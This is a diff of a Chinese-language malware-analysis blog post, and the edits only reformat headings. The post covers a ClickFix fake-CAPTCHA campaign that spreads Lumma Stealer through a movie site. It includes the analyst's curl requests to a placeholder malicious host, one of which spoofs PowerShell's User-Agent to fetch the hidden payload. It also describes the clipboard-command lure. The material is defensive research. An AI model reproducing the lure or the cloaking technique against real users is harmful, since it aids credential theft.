@@ -20,12 +20,12 @@ tags: [資安, 惡意程式分析, lumma stealer, clickfix]
 
 分析顯示，Movieffm 網站的頁面中被植入了外部 JavaScript 腳本。經分析，此腳本會動態向遠端伺服器請求並載入一段經過高度混淆的程式碼。
 
-##### 前端腳本
+**前端腳本**
 ![movieffm javascript](/img/in-post/movieLumma/image-3.png)
 
 該腳本的主要功能是動態建構並發出一個請求，用以載入更複雜的遠端 JavaScript 腳本。透過 Burp Suite 進行流量攔截，可以看到伺服器回應的 JavaScript 內容經過高度混淆。
 
-##### 前端回傳的 javascript response
+**前端回傳的 javascript response**
 ![burp response](/img/in-post/movieLumma/image-4.png)
 
 初步分析這份龐大的混淆腳本後，確認其核心功能之一是進行使用者 Fingerprinting。透過分析使用者的環境以精準投放 payload 或規避網路或防毒軟體的偵查。
@@ -43,12 +43,12 @@ tags: [資安, 惡意程式分析, lumma stealer, clickfix]
 
 此釣魚頁面的網址每次都不同，但透過 WHOIS 查詢，均發現其利用 Cloudflare 進行反向代理，增加了追蹤其來源伺服器的難度。
 
-##### whois 查詢結果
+**whois 查詢結果**
 ![whois-cloudflare](/img/in-post/movieLumma/image-14.png)
 
 當使用者點擊頁面上的 "I'm not a robot" 核取方塊時，網頁會執行一段 JavaScript，將一串惡意指令複製到使用者的剪貼簿中，並同時跳出一個彈窗，指示使用者按下 Ctrl + R（或 Cmd + R），然後貼上並執行指令。
 
-##### 頁面誘騙使用者點擊「I'm not a robot」按鈕。
+**頁面誘騙使用者點擊「I'm not a robot」按鈕。**
 ![alt text](/img/in-post/movieLumma/image-9.png)
 
 被複製的指令如下
@@ -71,7 +71,7 @@ curl -i "http://malicious.site/gbg7/rhfb.c"
 
 當我們嘗試直接用 curl 訪問 PowerShell 將要下載的 URL時，卻發現請求被重新導向到無害的 Steam 網站，暗示伺服器端存在額外的檢查機制。
 
-##### curl 返回結果為 redirect
+**curl 返回結果為 redirect**
 ![curl fingerprinting](/img/in-post/movieLumma/image-12.png)
 
 我們推測伺服器會驗證請求的 User-Agent。因此，我們在 curl 指令中模擬 PowerShell 的 User-Agent 再次發出請求：
@@ -81,7 +81,7 @@ curl -s -X GET "http://malicious.site/gbg7/" -H "User-Agent: Mozilla/5.0 (Window
 
 這次，伺服器成功回傳了真正的惡意 PowerShell 腳本，只有來自受害者機器上 PowerShell 程式的流量才會收到惡意 payload，而來自普通瀏覽器或分析工具的請求則會被另外重新導向。
 
-##### 模擬 powershell 結果為惡意腳本
+**模擬 powershell 結果為惡意腳本**
 ![powershell user agent response](/img/in-post/movieLumma/image-13.png)
 
 ### 階段四：最終目標 - Lumma Stealer 資訊竊取軟體
